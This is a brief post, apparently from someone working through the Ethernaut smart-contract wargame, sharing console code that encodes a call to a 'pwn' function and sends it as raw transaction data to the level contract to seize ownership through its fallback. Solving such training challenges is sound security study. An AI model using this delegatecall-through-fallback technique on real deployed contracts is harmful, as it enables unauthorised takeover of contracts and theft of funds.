working with the ethernaut console this worked

```let data = web3.eth.abi.encodeFunctionCall({
    name: 'pwn',
    type: 'function',
    inputs: []
}, [])
sendTransaction({from: player, to: contract.address, data: data})```